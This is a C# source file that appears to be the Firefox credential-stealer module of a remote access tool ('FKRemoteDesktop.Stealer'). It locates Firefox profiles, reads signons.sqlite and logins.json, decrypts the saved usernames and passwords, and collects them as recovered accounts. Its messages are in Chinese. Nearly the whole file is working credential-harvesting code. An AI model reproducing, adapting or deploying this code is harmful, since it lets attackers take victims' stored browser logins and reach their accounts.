using FKRemoteDesktop.Helpers;
using FKRemoteDesktop.Message.MessageStructs;
using FKRemoteDesktop.Stealer.DB;
using FKRemoteDesktop.Stealer.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.Serialization;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Stealer.Browsers
{
    public class FirefoxPasswordReader : IAccountReader
    {
        [DataContract]
        private class FFLogins
        {
            [DataMember(Name = "nextId")]
            public long NextId { get; set; }

            [DataMember(Name = "logins")]
            public Login[] Logins { get; set; }

            [IgnoreDataMember]
            [DataMember(Name = "potentiallyVulnerablePasswords")]
            public object[] PotentiallyVulnerablePasswords { get; set; }

            [IgnoreDataMember]
            [DataMember(Name = "dismissedBreachAlertsByLoginGUID")]
            public DismissedBreachAlertsByLoginGuid DismissedBreachAlertsByLoginGuid { get; set; }

            [DataMember(Name = "version")]
            public long Version { get; set; }
        }

        [DataContract]
        private class DismissedBreachAlertsByLoginGuid
        {
        }

        [DataContract]
        private class Login
        {
            [DataMember(Name = "id")]
            public long Id { get; set; }

            [DataMember(Name = "hostname")]
            public Uri Hostname { get; set; }

            [DataMember(Name = "httpRealm")]
            public object HttpRealm { get; set; }

            [DataMember(Name = "formSubmitURL")]
            public Uri FormSubmitUrl { get; set; }

            [DataMember(Name = "usernameField")]
            public string UsernameField { get; set; }

            [DataMember(Name = "passwordField")]
            public string PasswordField { get; set; }

            [DataMember(Name = "encryptedUsername")]
            public string EncryptedUsername { get; set; }

            [DataMember(Name = "encryptedPassword")]
            public string EncryptedPassword { get; set; }

            [DataMember(Name = "guid")]
            public string Guid { get; set; }

            [DataMember(Name = "encType")]
            public long EncType { get; set; }

            [DataMember(Name = "timeCreated")]
            public long TimeCreated { get; set; }

            [DataMember(Name = "timeLastUsed")]
            public long TimeLastUsed { get; set; }

            [DataMember(Name = "timePasswordChanged")]
            public long TimePasswordChanged { get; set; }

            [DataMember(Name = "timesUsed")]
            public long TimesUsed { get; set; }
        }

        public string ApplicationName => "Firefox 浏览器";
        public string KeyName => "Password";

        public IEnumerable<RecoveredAccount> ReadAccounts()
        {
            var result = new List<RecoveredAccount>();
            string appDataFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string firefoxPath = Path.Combine(appDataFolderPath, "Mozilla\\Firefox\\Profiles");
            string[] dirs = new string[] { };
            try
            {
                dirs = Directory.GetDirectories(firefoxPath);
            }
            catch (Exception) { }
            if (dirs.Length == 0)
            {
                result.Add(new RecoveredAccount
                {
                    KeyName = KeyName,
                    Url = "未找到该浏览器进程",
                    Username = "N/A",
                    Password = "N/A",
                    Application = ApplicationName
                });
                return result;
            }
            foreach (string dir in dirs)
            {
                string signonsFile = string.Empty;
                string loginsFile = string.Empty;
                bool signonsFound = false;
                bool loginsFound = false;
                string[] files = Directory.GetFiles(dir, "signons.sqlite");
                if (files.Length > 0)
                {
                    signonsFile = files[0];
                    signonsFound = true;
                }
                files = Directory.GetFiles(dir, "logins.json");
                if (files.Length > 0)
                {
                    loginsFile = files[0];
                    loginsFound = true;
                }
                if (loginsFound || signonsFound)
                {
                    using (var decrypter = new FireFoxDecryptor())
                    {
                        var r = decrypter.Init(dir);
                        if (signonsFound)
                        {
                            SQLHandler sqlDatabase;
                            if (!File.Exists(signonsFile))
                            {
                                result.Add(new RecoveredAccount
                                {
                                    KeyName = KeyName,
                                    Url = "未找到该浏览器进程",
                                    Username = "N/A",
                                    Password = "N/A",
                                    Application = ApplicationName
                                });
                                return result;
                            }
                            try
                            {
                                sqlDatabase = new SQLHandler(signonsFile);
                            }
                            catch (Exception ex)
                            {
                                result.Add(new RecoveredAccount
                                {
                                    KeyName = KeyName,
                                    Url = "访问浏览器DB出错: " + ex.Message,
                                    Username = "N/A",
                                    Password = "N/A",
                                    Application = ApplicationName
                                });
                                return result;
                            }
                            if (!sqlDatabase.ReadTable("moz_logins"))
                            {
                                result.Add(new RecoveredAccount
                                {
                                    KeyName = KeyName,
                                    Url = "浏览器DB中未找到账密信息",
                                    Username = "N/A",
                                    Password = "N/A",
                                    Application = ApplicationName
                                });
                                return result;
                            }
                            for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
                            {
                                try
                                {
                                    var host = sqlDatabase.GetValue(i, "hostname") as string;
                                    var user = decrypter.Decrypt(sqlDatabase.GetValue(i, "encryptedUsername") as string);
                                    var pass = decrypter.Decrypt(sqlDatabase.GetValue(i, "encryptedPassword") as string);
                                    if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
                                    {
                                        result.Add(new RecoveredAccount
                                        {
                                            KeyName = KeyName,
                                            Url = host,
                                            Username = user,
                                            Password = pass,
                                            Application = ApplicationName
                                        });
                                    }
                                }
                                catch (Exception ex)
                                {
                                    result.Add(new RecoveredAccount
                                    {
                                        KeyName = KeyName,
                                        Url = "访问浏览器DB出错: " + ex.Message,
                                        Username = "N/A",
                                        Password = "N/A",
                                        Application = ApplicationName
                                    });
                                }
                            }
                        }

                        if (loginsFound)
                        {
                            FFLogins ffLoginData;
                            using (var sr = File.OpenRead(loginsFile))
                            {
                                ffLoginData = JsonHelper.Deserialize<FFLogins>(sr);
                            }
                            foreach (Login loginData in ffLoginData.Logins)
                            {
                                string username = decrypter.Decrypt(loginData.EncryptedUsername);
                                string password = decrypter.Decrypt(loginData.EncryptedPassword);
                                result.Add(new RecoveredAccount
                                {
                                    KeyName = KeyName,
                                    Username = username,
                                    Password = password,
                                    Url = loginData.Hostname.ToString(),
                                    Application = ApplicationName
                                });
                            }
                        }
                    }
                }
            }
            return result;
        }
    }
}